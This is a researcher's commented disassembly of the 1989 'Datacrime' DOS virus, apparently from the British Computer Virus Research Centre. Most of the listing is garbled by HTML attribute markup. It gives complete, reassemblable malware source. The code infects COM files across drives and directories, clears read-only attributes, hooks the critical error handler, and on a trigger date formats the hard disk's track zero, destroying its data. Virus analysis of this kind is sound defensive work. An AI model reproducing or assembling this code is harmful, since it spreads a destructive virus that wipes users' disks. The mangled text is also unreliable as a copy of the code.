﻿

;
; IMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM;
; :                 British Computer Virus Research Centre                   :
; :  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    :
; :  Telephone:     Domestic   0273-26105,   International  +44-273-26105    :
; :                                                                          :
; :                          The 'Datacrime' Virus                           :
; :                Disassembled by Joe Hirst,        May 1989                :
; :                                                                          :
; :                      Copyright (c) Joe Hirst 1989.                       :
; :                                                                          :
; :      This listing is only to be made available to virus researchers      :
; :                or software writers on a need-to-know basis.              :
; HMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM< ;="" the="" virus="" occurs="" attached="" to="" the="" end="" of="" a="" com="" file.="" the="" first="" ;="" three="" bytes="" of="" the="" program="" are="" stored="" in="" the="" virus,="" and="" replaced="" ;="" by="" a="" branch="" to="" the="" beginning="" of="" the="" virus.="" ;="" the="" disassembly="" has="" been="" tested="" by="" re-assembly="" using="" masm="" 5.0.="" ;="" addressability="" is="" maintained="" by="" taking="" the="" offset="" from="" the="" ;="" initial="" jump="" to="" the="" virus.="" this="" is="" the="" length="" of="" the="" host="" minus="" ;="" three="" (length="" of="" the="" jump="" instruction).="" three="" is="" subtracted="" ;="" from="" this="" figure="" (presumably="" the="" length="" of="" the="" original="" "host"="" ;="" program="" when="" the="" virus="" was="" released).="" the="" result="" is="" kept="" in="" ;="" register="" si.="" data="" addresses="" add="" si+106h="" (com="" origin="" of="" 100h="" ;="" +="" length="" of="" jump="" +="" length="" of="" initial="" host)="" to="" the="" offset="" of="" the="" ;="" data="" item="" within="" the="" virus.="" ;="" note="" that="" if="" it="" does="" nothing="" else="" this="" virus="" will="" almost="" certainly="" ;="" screw="" up="" the="" critical="" error="" handler="" because:="" ;="" 1.="" there="" is="" a="" missing="" segment="" override="" on="" the="" restore="" of="" the="" ;="" original="" segment="" (presumably="" the="" result="" of="" inserting="" such="" ;="" overrides="" manually),="" and="" ;="" 2.="" if="" the="" virus="" looks="" at="" more="" than="" one="" disk="" it="" will="" reinstall="" ;="" the="" routine,="" overwriting="" the="" original="" saved="" vector="" with="" that="" ;="" of="" its="" own="" routine.="" code="" segment="" byte="" public="" 'code'="" assume="" cs:code,ds:code="" org="" 09ah="" dw009a="" dw="" org="" 101h="" dw0101="" dw="" ;="" start="" of="" virus="" -="" set="" up="" relocation="" factor="" org="" 0="" start:="" mov="" si,cs:dw0101="" ;="" address="" initial="" jump="" to="" virus="" sub="" si,3="" ;="" length="" of="" original="" host="" (?)="" mov="" ax,si="" ;="" copy="" relocation="" factor="" cmp="" ax,0="" ;="" is="" it="" zero="" (initial="" release)?="" jne="" bp0012="" ;="" branch="" if="" not="" jmp="" bp0110="" ;="" infection="" routine="" ;="" restore="" host="" and="" test="" initial="" start="" month="" bp0012:="" lea="" di,db03d5[si+106h]="" ;="" address="" stored="" start="" of="" host="" mov="" bx,0100h="" ;="" address="" beginning="" of="" host="" program="" mov="" cx,5="" ;="" word="" count="" bp001c:="" mov="" ax,[di]="" ;="" get="" next="" word="" mov="" [bx],ax="" ;="" replace="" next="" word="" add="" bx,2="" ;="" address="" next="" target="" word="" add="" di,2="" ;="" address="" next="" stored="" word="" dec="" cx="" ;="" reduce="" count="" jnz="" bp001c="" ;="" repeat="" for="" each="" word="" mov="" ah,2ah="" ;="" get="" date="" function="" int="" 21h="" ;="" dos="" service="" mov="" al,cs:db03ea[si+106h]="" ;="" get="" start="" month="" cmp="" al,dh="" ;="" is="" it="" start="" month="" yet?="" jg="" bp0040="" ;="" branch="" if="" not="" mov="" cs:db03ea[si+106h],0="" ;="" don't="" do="" test="" any="" more="" jmp="" bp0045="" ;="" pass="" control="" to="" host="" program="" bp0040:="" mov="" bx,0100h="" ;="" address="" beginning="" of="" host="" program="" jmp="" bx="" ;="" branch="" to="" host="" program="" ;="" are="" we="" in="" target="" part="" of="" year?="" bp0045:="" mov="" ax,cs:dw03e8[si+106h]="" ;="" get="" start="" month="" and="" day="" cmp="" ax,dx="" ;="" compare="" to="" actual="" jl="" bp0051="" ;="" branch="" if="" after="" start="" date="" jmp="" bp0110="" ;="" infection="" routine="" ;="" is="" there="" a="" hard="" disk?="" bp0051:="" mov="" ax,0="" ;="" clear="" register="" push="" ds="" mov="" ds,ax="" ;="" address="" segment="" zero="" mov="" bx,0106h="" ;="" address="" int="" 41h="" segment="" mov="" ax,[bx]="" ;="" get="" int="" 41h="" segment="" pop="" ds="" cmp="" ax,0="" ;="" is="" it="" zero="" (no="" hard="" disk)?="" jne="" bp0067="" ;="" branch="" if="" not="" mov="" bx,0100h="" ;="" address="" beginning="" of="" host="" program="" jmp="" bx="" ;="" branch="" to="" host="" program="" ;="" display="" message="" and="" format="" track="" zero,="" heads="" 0="" -="" 8="" bp0067:="" lea="" bx,db00e7[si+106h]="" ;="" address="" encrypted="" string="" mov="" cl,29h="" ;="" load="" length="" of="" string="" bp006d:="" mov="" dl,cs:[bx]="" ;="" get="" a="" character="" xor="" dl,55h="" ;="" decrypt="" character="" mov="" ah,2="" ;="" display="" character="" function="" int="" 21h="" ;="" dos="" service="" inc="" bx="" ;="" address="" next="" character="" dec="" cl="" ;="" reduce="" count="" jnz="" bp006d="" ;="" repeat="" for="" each="" character="" mov="" bx,offset="" dw00a7+106h="" ;="" address="" format="" buffer="" (no="" si?)="" mov="" ch,0="" ;="" track="" zero="" mov="" dx,0080h="" ;="" head="" zero,="" first="" hard="" disk="" bp0084:="" mov="" ch,0="" ;="" track="" zero="" mov="" al,0="" ;="" load="" zero="" mov="" cl,6="" ;="" \="" multiply="" zero="" by="" 64="" shl="" al,cl="" ;="" mov="" cl,al="" ;="" move="" result="" (zero)="" or="" cl,1="" ;="" now="" its="" one="" (and="" next="" line="" zero)="" mov="" ax,0500h="" ;="" format="" track,="" interleave="" zero="" int="" 13h="" ;="" disk="" i/o="" jb="" bp009f="" ;="" branch="" if="" error="" inc="" dh="" ;="" next="" head="" cmp="" dh,9="" ;="" is="" it="" head="" nine?="" jne="" bp0084="" ;="" format="" if="" not="" bp009f:="" mov="" ah,2="" ;="" display="" character="" function="" mov="" dl,7="" ;="" beep="" int="" 21h="" ;="" dos="" service="" jmp="" bp009f="" ;="" loop="" on="" beep="" ;="" format="" table="" (required="" for="" ats="" and="" ps/2s)="" ;="" program="" does="" not="" in="" fact="" point="" to="" this="" because="" the="" reference="" ;="" to="" register="" si="" is="" missing="" dw00a7="" db="" 0,="" 01h,="" 0,="" 02h,="" 0,="" 03h,="" 0,="" 04h,="" 0,="" 05h,="" 0,="" 06h,="" 0,="" 07h,="" 0,="" 08h="" db="" 0,="" 09h,="" 0,="" 0ah,="" 0,="" 0bh,="" 0,="" 0ch,="" 0,="" 0dh,="" 0,="" 0eh,="" 0,="" 0fh,="" 0,="" 10h="" db="" 0,="" 11h,="" 0,="" 12h,="" 0,="" 13h,="" 0,="" 14h,="" 0,="" 15h,="" 0,="" 16h,="" 0,="" 17h,="" 0,="" 18h="" db="" 0,="" 19h,="" 0,="" 1ah,="" 0,="" 1bh,="" 0,="" 1ch,="" 0,="" 1dh,="" 0,="" 1eh,="" 0,="" 1fh,="" 0,="" 20h="" ;="" the="" next="" field="" decodes="" to:="" ;="" db="" 'datacrime="" virus',="" 0ah,="" 0dh="" ;="" db="" 'released:="" 1="" march="" 1989',="" 0ah,="" 0dh="" db00e7="" db="" 11h,="" 14h,="" 01h,="" 14h,="" 16h,="" 07h,="" 1ch,="" 18h,="" 10h="" db="" 75h,="" 03h,="" 1ch,="" 07h,="" 00h,="" 06h,="" 5fh,="" 58h="" db="" 07h,="" 10h,="" 19h,="" 10h,="" 14h,="" 06h,="" 10h,="" 11h="" db="" 6fh,="" 75h,="" 64h,="" 75h,="" 18h,="" 14h,="" 07h,="" 16h="" db="" 1dh,="" 75h,="" 64h,="" 6ch,="" 6dh,="" 6ch,="" 5fh,="" 58h="" ;="" start="" of="" infection="" routine="" bp0110:="" mov="" ah,19h="" ;="" get="" current="" disk="" function="" int="" 21h="" ;="" dos="" service="" mov="" cs:db03f5[si+106h],al="" ;="" save="" current="" disk="" mov="" ah,47h="" ;="" get="" current="" directory="" function="" mov="" dx,0="" ;="" default="" disk="" push="" si="" lea="" si,db03f6+1[si+106h]="" ;="" original="" directory="" store="" int="" 21h="" ;="" dos="" service="" pop="" si="" mov="" cs:db03ec[si+106h],0="" ;="" set="" disk="" drive="" pointer="" to="" start="" jmp="" bp0130="" ;="" select="" disk="" drive="" ;="" select="" disk="" drive="" from="" table="" bp0130:="" call="" bp0172="" ;="" install="" int="" 24h="" routine="" lea="" bx,db03e3[si+106h]="" ;="" address="" disk="" drive="" table="" mov="" al,cs:db03ec[si+106h]="" ;="" get="" disk="" drive="" pointer="" inc="" cs:db03ec[si+106h]="" ;="" update="" disk="" drive="" pointer="" mov="" ah,0="" ;="" clear="" top="" of="" register="" add="" bx,ax="" ;="" add="" disk="" drive="" pointer="" mov="" al,cs:[bx]="" ;="" get="" next="" disk="" drive="" mov="" dl,al="" ;="" move="" device="" for="" select="" cmp="" al,0ffh="" ;="" end="" of="" table?="" jne="" bp0151="" ;="" branch="" if="" not="" jmp="" bp023c="" ;="" tidy="" up="" and="" terminate="" bp0151:="" mov="" ah,0eh="" ;="" select="" disk="" function="" int="" 21h="" ;="" dos="" service="" mov="" ah,47h="" ;="" get="" current="" directory="" function="" mov="" dl,0="" ;="" default="" drive="" push="" si="" lea="" si,db0417+1[si+106h]="" ;="" current="" directory="" path="" name="" int="" 21h="" ;="" dos="" service="" pop="" si="" mov="" bx,4="" ;="" address="" critical="" error="" mov="" al,cs:[bx]="" ;="" get="" critical="" error="" code="" cmp="" al,3="" ;="" was="" it="" three?="" jne="" bp01b7="" ;="" branch="" if="" not="" mov="" al,0="" ;="" \="" set="" it="" back="" to="" zero="" mov="" cs:[bx],al="" ;="" jmp="" bp0130="" ;="" select="" next="" disk="" drive="" ;="" install="" interrupt="" 24h="" routine="" bp0172:="" xor="" ax,ax="" ;="" clear="" register="" push="" ds="" mov="" ds,ax="" ;="" address="" segment="" zero="" mov="" bx,0090h="" ;="" address="" int="" 24h="" vector="" mov="" ax,[bx+2]="" ;="" get="" int="" 24h="" segment="" mov="" cs:dw03cf[si+106h],ax="" ;="" save="" int="" 24h="" segment="" mov="" ax,[bx]="" ;="" get="" int="" 24h="" offset="" mov="" cs:dw03d1[si+106h],ax="" ;="" save="" int="" 24h="" offset="" mov="" ax,cs="" ;="" get="" current="" segment="" mov="" [bx+2],ax="" ;="" set="" new="" int="" 24h="" segment="" lea="" ax,bp01ae[si+106h]="" ;="" int="" 24h="" routine="" mov="" [bx],ax="" ;="" set="" new="" int="" 24h="" offset="" pop="" ds="" ret="" ;="" restore="" original="" interrupt="" 24h="" bp0196:="" xor="" ax,ax="" ;="" clear="" register="" push="" ds="" mov="" ds,ax="" ;="" address="" segment="" zero="" mov="" bx,0090h="" ;="" address="" int="" 24h="" vector="" mov="" ax,cs:dw03cf[si+106h]="" ;="" get="" int="" 24h="" segment="" mov="" [bx+2],ax="" ;="" restore="" int="" 24h="" segment="" mov="" ax,dw03d1[si+106h]="" ;="" get="" int="" 24h="" offset="" (missing="" cs:)="" mov="" [bx],ax="" ;="" restore="" int="" 24h="" offset="" pop="" ds="" ret="" ;="" interrupt="" 24h="" routine="" bp01ae:="" mov="" al,3="" ;="" fail="" the="" system="" call="" mov="" bx,4="" ;="" address="" critical="" error="" byte="" mov="" cs:[bx],al="" ;="" save="" code="" iret="" bp01b7:="" call="" bp02da="" ;="" find="" and="" infect="" a="" file="" mov="" al,cs:db03eb[si+106h]="" ;="" get="" infection="" completed="" switch="" cmp="" al,1="" ;="" is="" it="" on?="" jne="" bp01c6="" ;="" branch="" if="" not="" jmp="" bp023c="" ;="" tidy="" up="" and="" terminate="" bp01c6:="" call="" bp0260="" ;="" get="" next="" directory="" jnb="" bp01ce="" ;="" branch="" if="" found="" jmp="" bp0130="" ;="" select="" next="" disk="" drive="" bp01ce:="" mov="" cx,0040h="" ;="" maximum="" characters="" to="" copy="" push="" si="" dec="" di="" ;="" \="" dec="" di="" ;="" )="" address="" back="" to="" '*.*'="" dec="" di="" ;="" mov="" word="" ptr="" [di],'\="" '="" ;="" word="" reversed,="" but="" overwritten="" soon="" mov="" si,bx="" ;="" address="" file="" name="" cld="" bp01dc:="" lodsb="" ;="" \="" copy="" a="" character="" stosb="" ;="" dec="" cx="" ;="" decrement="" count="" cmp="" al,0="" ;="" was="" last="" character="" zero?="" jne="" bp01dc="" ;="" next="" character="" if="" not="" pop="" si="" mov="" ah,3bh="" ;="" change="" current="" directory="" function="" lea="" dx,db0438[si+106h]="" ;="" directory="" pathname="" int="" 21h="" ;="" dos="" service="" call="" bp02da="" ;="" find="" and="" infect="" a="" file="" mov="" al,cs:db03eb[si+106h]="" ;="" get="" infection="" completed="" switch="" cmp="" al,1="" ;="" is="" it="" on?="" je="" bp023c="" ;="" tidy="" up="" and="" terminate="" if="" yes="" call="" bp0260="" ;="" get="" next="" directory="" jnb="" bp01ce="" ;="" branch="" if="" found="" mov="" ah,3bh="" ;="" change="" current="" directory="" function="" lea="" dx,db0417[si+106h]="" ;="" current="" directory="" path="" name="" int="" 21h="" ;="" dos="" service="" inc="" cs:db03e2[si+106h]="" ;="" increment="" directory="" count="" call="" bp0260="" ;="" get="" next="" directory="" jb="" bp023c="" ;="" branch="" if="" not="" found="" mov="" al,cs:db03e2[si+106h]="" ;="" get="" directory="" count="" bp0214:="" cmp="" al,0="" ;="" is="" directory="" count="" zero="" yet?="" jne="" bp021d="" ;="" branch="" if="" not="" add="" bx,9="" ;="" jmp="" bp01ce="" ;="" add="" directory="" name="" to="" path="" bp021d:="" mov="" ah,4fh="" ;="" find="" next="" file="" function="" push="" ax="" int="" 21h="" ;="" dos="" service="" pop="" ax="" jnb="" bp0228="" ;="" branch="" if="" no="" error="" jmp="" bp0130="" ;="" select="" next="" disk="" drive="" bp0228:="" push="" ax="" mov="" ah,2fh="" ;="" get="" dta="" function="" int="" 21h="" ;="" dos="" service="" add="" bx,15h="" ;="" address="" attributes="" byte="" mov="" al,10h="" ;="" directory="" attribute="" cmp="" cs:[bx],al="" ;="" is="" it="" a="" directory?="" pop="" ax="" jne="" bp021d="" ;="" branch="" if="" not="" dec="" al="" ;="" decrement="" directory="" count="" jmp="" bp0214="" ;="" reset="" disk="" and="" directory,="" and="" pass="" control="" to="" host="" bp023c:="" mov="" ah,0eh="" ;="" select="" disk="" function="" mov="" dl,cs:db03f5[si+106h]="" ;="" get="" original="" current="" disk="" int="" 21h="" ;="" dos="" service="" mov="" ah,3bh="" ;="" change="" current="" directory="" function="" lea="" dx,db03f6[si+106h]="" ;="" original="" directory="" int="" 21h="" ;="" dos="" service="" call="" bp0196="" ;="" restore="" int="" 24h="" mov="" ax,si="" ;="" copy="" relocation="" factor="" cmp="" ax,0="" ;="" is="" it="" zero="" (initial="" release)?="" je="" bp025c="" ;="" terminate="" 8f="" not="" mov="" bx,0100h="" ;="" address="" beginning="" of="" host="" program="" jmp="" bx="" ;="" branch="" to="" host="" program="" ;="" terminate="" bp025c:="" mov="" ah,4ch="" ;="" end="" process="" function="" int="" 21h="" ;="" dos="" service="" ;="" get="" next="" directory="" bp0260:="" lea="" di,db0438+1[si+106h]="" ;="" directory="" pathname="" mov="" cx,003ah="" ;="" length="" to="" clear="" mov="" al,0="" ;="" set="" to="" zero="" cld="" repz="" stosb="" ;="" clear="" pathname="" area="" mov="" ah,47h="" ;="" get="" current="" directory="" function="" push="" si="" mov="" dx,0="" ;="" current="" drive="" lea="" si,db0438+1[si+106h]="" ;="" directory="" pathname="" int="" 21h="" ;="" dos="" service="" pop="" si="" cld="" lea="" di,db0438+1[si+106h]="" ;="" directory="" pathname="" mov="" cx,0040h="" ;="" length="" to="" search="" mov="" al,0="" ;="" search="" for="" zero="" repnz="" scasb="" ;="" search="" for="" end="" of="" pathname="" jz="" bp0289="" ;="" branch="" if="" found="" stc="" ret="" ;="" set="" file="" name="" wildcard="" on="" path="" bp0289:="" dec="" di="" ;="" \="" back="" two="" positions="" dec="" di="" ;="" mov="" al,[di]="" ;="" get="" character="" cmp="" al,'\'="" ;="" does="" path="" end="" in="" dir="" delim?="" je="" bp0294="" ;="" branch="" if="" yes="" inc="" di="" ;="" next="" position="" mov="" al,'\'="" ;="" make="" next="" character="" a="" dir="" delim="" bp0294:="" mov="" [di],al="" ;="" store="" character="" inc="" di="" ;="" next="" position="" mov="" al,'*'="" ;="" all="" files="" mov="" [di],al="" ;="" store="" character="" inc="" di="" ;="" next="" position="" mov="" al,'.'="" ;="" extension="" mov="" [di],al="" ;="" store="" character="" inc="" di="" ;="" next="" position="" mov="" al,'*'="" ;="" all="" extensions="" mov="" [di],al="" ;="" store="" character="" inc="" di="" ;="" next="" position="" lea="" dx,db0438[si+106h]="" ;="" address="" directory="" pathname="" mov="" ah,4eh="" ;="" find="" first="" file="" function="" mov="" cx,0010h="" ;="" find="" directories="" int="" 21h="" ;="" dos="" service="" jnb="" bp02b4="" ;="" branch="" if="" no="" error="" ret="" ;="" valid="" directories="" only="" bp02b4:="" mov="" ah,2fh="" ;="" get="" dta="" function="" int="" 21h="" ;="" dos="" service="" add="" bx,15h="" ;="" address="" attribute="" byte="" mov="" al,10h="" ;="" directory="" attribute="" cmp="" cs:[bx],al="" ;="" is="" it="" a="" directory?="" jne="" bp02d2="" ;="" branch="" if="" not="" clc="" mov="" ah,2fh="" ;="" get="" dta="" function="" int="" 21h="" ;="" dos="" service="" add="" bx,1eh="" ;="" address="" directory="" name="" mov="" al,'.'="" ;="" prepare="" to="" test="" first="" byte="" cmp="" cs:[bx],al="" ;="" is="" it="" a="" pointer="" to="" another="" dir?="" je="" bp02d2="" ;="" branch="" if="" yes="" ret="" bp02d2:="" mov="" ah,4fh="" ;="" find="" next="" file="" function="" int="" 21h="" ;="" dos="" service="" jnb="" bp02b4="" ;="" branch="" if="" no="" error="" stc="" ret="" ;="" find="" and="" infect="" a="" file="" bp02da:="" mov="" cs:db03eb[si+106h],0="" ;="" set="" infection="" completed="" switch="" off="" mov="" ah,4eh="" ;="" find="" first="" file="" function="" mov="" cx,7="" ;="" all="" files="" lea="" dx,db03ed[si+106h]="" ;="" address="" '*.com'="" int="" 21h="" ;="" dos="" service="" jnb="" bp02f6="" ;="" branch="" if="" no="" error="" ret="" bp02ef:="" mov="" ah,4fh="" ;="" find="" next="" file="" function="" int="" 21h="" ;="" dos="" service="" jnb="" bp02f6="" ;="" branch="" if="" no="" error="" ret="" ;="" exclude="" command.com="" bp02f6:="" mov="" bx,00a4h="" ;="" address="" seventh="" letter="" of="" name="" mov="" al,[bx]="" ;="" get="" character="" cmp="" al,'d'="" ;="" is="" it="" a="" 'd'="" (as="" in="" command.com)?="" jne="" bp0301="" ;="" branch="" if="" not="" jmp="" bp02ef="" ;="" next="" file="" ;="" is="" it="" already="" infected?="" bp0301:="" mov="" bx,0096h="" ;="" address="" time="" of="" file="" mov="" cx,[bx]="" ;="" get="" time="" of="" file="" add="" bx,2="" ;="" address="" date="" of="" file="" mov="" dx,[bx]="" ;="" get="" date="" of="" file="" mov="" al,cl="" ;="" copy="" low="" byte="" of="" time="" and="" al,0e0h="" ;="" isolate="" low="" part="" of="" minutes="" mov="" ah,al="" ;="" copy="" low="" part="" of="" minutes="" shr="" al,1="" ;="" \="" shr="" al,1="" ;="" \="" shr="" al,1="" ;="" )="" move="" mins="" to="" secs="" position="" shr="" al,1="" ;="" shr="" al,1="" ;="" or="" al,ah="" ;="" combine="" with="" minutes="" cmp="" al,cl="" ;="" compare="" to="" actual="" time="" jne="" bp0323="" ;="" branch="" if="" different="" jmp="" bp02ef="" ;="" find="" next="" file="" ;="" uninfected="" com="" file="" found="" bp0323:="" push="" cx="" push="" dx="" mov="" ax,cs:dw009a="" ;="" get="" low-order="" length="" mov="" cs:dw03d3[si+106h],ax="" ;="" save="" low-order="" length="" call="" bp03aa="" ;="" remove="" read-only="" attribute="" mov="" ax,3d02h="" ;="" open="" handle="" (r/w)="" function="" mov="" dx,009eh="" ;="" file="" name="" int="" 21h="" ;="" dos="" service="" mov="" bx,ax="" ;="" move="" handle="" mov="" ah,3fh="" ;="" read="" handle="" function="" lea="" dx,db03d5[si+106h]="" ;="" store="" area="" for="" start="" of="" host="" mov="" cx,000ah="" ;="" read="" first="" ten="" bytes="" int="" 21h="" ;="" dos="" service="" mov="" ax,4202h="" ;="" move="" file="" pointer="" (eof)="" function="" xor="" cx,cx="" ;="" \="" no="" displacement="" xor="" dx,dx="" ;="" int="" 21h="" ;="" dos="" service="" mov="" cx,offset="" endadr="" ;="" length="" of="" virus="" nop="" lea="" dx,[si+106h]="" ;="" address="" start="" of="" virus="" mov="" ah,40h="" ;="" write="" handle="" function="" int="" 21h="" ;="" dos="" service="" mov="" ax,4200h="" ;="" move="" file="" pointer="" (start)="" function="" xor="" cx,cx="" ;="" \="" no="" displacement="" xor="" dx,dx="" ;="" int="" 21h="" ;="" dos="" service="" mov="" ax,cs:dw009a="" ;="" get="" low-order="" length="" sub="" ax,3="" ;="" subtract="" length="" of="" jump="" mov="" cs:dw03e0[si+106h],ax="" ;="" store="" displacement="" in="" jump="" mov="" ah,40h="" ;="" write="" handle="" function="" mov="" cx,3="" ;="" length="" of="" jump="" lea="" dx,db03df[si+106h]="" ;="" address="" jump="" instruction="" int="" 21h="" ;="" dos="" service="" pop="" dx="" pop="" cx="" and="" cl,0e0h="" ;="" isolate="" low="" part="" of="" minutes="" mov="" al,cl="" ;="" copy="" low="" part="" of="" minutes="" shr="" cl,1="" ;="" \="" shr="" cl,1="" ;="" \="" shr="" cl,1="" ;="" )="" move="" mins="" to="" secs="" position="" shr="" cl,1="" ;="" shr="" cl,1="" ;="" or="" cl,al="" ;="" combine="" with="" minutes="" mov="" ax,5701h="" ;="" set="" file="" date="" &="" time="" function="" int="" 21h="" ;="" dos="" service="" mov="" ah,3eh="" ;="" close="" handle="" function="" int="" 21h="" ;="" dos="" service="" call="" bp03c1="" ;="" replace="" attributes="" mov="" cs:db03eb[si+106h],1="" ;="" set="" infection="" completed="" switch="" on="" mov="" ah,3bh="" ;="" change="" current="" directory="" function="" lea="" dx,db0417[si+106h]="" ;="" current="" directory="" path="" name="" int="" 21h="" ;="" dos="" service="" ret="" ;="" remove="" read-only="" attribute="" bp03aa:="" mov="" dx,009eh="" ;="" address="" file="" name="" mov="" ax,4300h="" ;="" get="" file="" attributes="" function="" int="" 21h="" ;="" dos="" service="" mov="" cs:dw03f3[si+106h],cx="" ;="" save="" attributes="" and="" cx,00feh="" ;="" set="" off="" read-only="" mov="" ax,4301h="" ;="" set="" file="" attributes="" function="" int="" 21h="" ;="" dos="" service="" ret="" ;="" replace="" attributes="" bp03c1:="" mov="" cx,cs:dw03f3[si+106h]="" ;="" get="" attributes="" mov="" dx,009eh="" ;="" address="" file="" name="" mov="" ax,4301h="" ;="" set="" file="" attributes="" function="" int="" 21h="" ;="" dos="" service="" ret="" dw03cf="" dw="" 1142h="" ;="" original="" int="" 24h="" segment="" dw03d1="" dw="" 175dh="" ;="" original="" int="" 24h="" offset="" dw03d3="" dw="" 0039h="" ;="" low-order="" length="" of="" host="" db03d5="" db="" 0ebh,="" 02eh,="" 090h,="" 'hello="" -'="" ;="" store="" area="" for="" start="" of="" host="" db03df="" db="" 0e9h="" ;="" \="" jump="" for="" host="" program="" dw03e0="" dw="" 0="" ;="" db03e2="" db="" 0bh="" db03e3="" db="" 2,="" 3,="" 0,="" 1,="" 0ffh="" ;="" disk="" drive="" table="" (c,="" d,="" a,="" b)="" dw03e8="" dw="" 0a0ch="" ;="" start="" month="" and="" day="" db03ea="" db="" 0="" ;="" start="" month="" db03eb="" db="" 0="" ;="" infection="" completed="" switch="" db03ec="" db="" 3="" ;="" disk="" drive="" pointer="" db03ed="" db="" '*.com',="" 0="" dw03f3="" dw="" 20h="" ;="" file="" attributes="" db03f5="" db="" 0="" ;="" original="" current="" disk="" db03f6="" db="" '\',="" 0,="" 'entura',="" 19h="" dup="" (0)="" ;="" original="" directory="" db0417="" db="" '\',="" 0,="" 'npak',="" 1bh="" dup="" (0)="" ;="" current="" directory="" db0438="" db="" '\*.*',="" 3ch="" dup="" (0)="" ;="" directory="" pathname="" db="" 000h,="" 02bh,="" 0c3h,="" 074h,="" 005h,="" 078h,="" 002h,="" 041h="" db="" 0c3h,="" 049h,="" 0c3h,="" 051h,="" 052h,="" 0a1h,="" 014h,="" 000h="" db="" 08bh,="" 00eh,="" 01ah,="" 000h,="" 08bh,="" 016h,="" 01ch,="" 000h="" endadr="" equ="" $="" code="" ends="" end="" start="">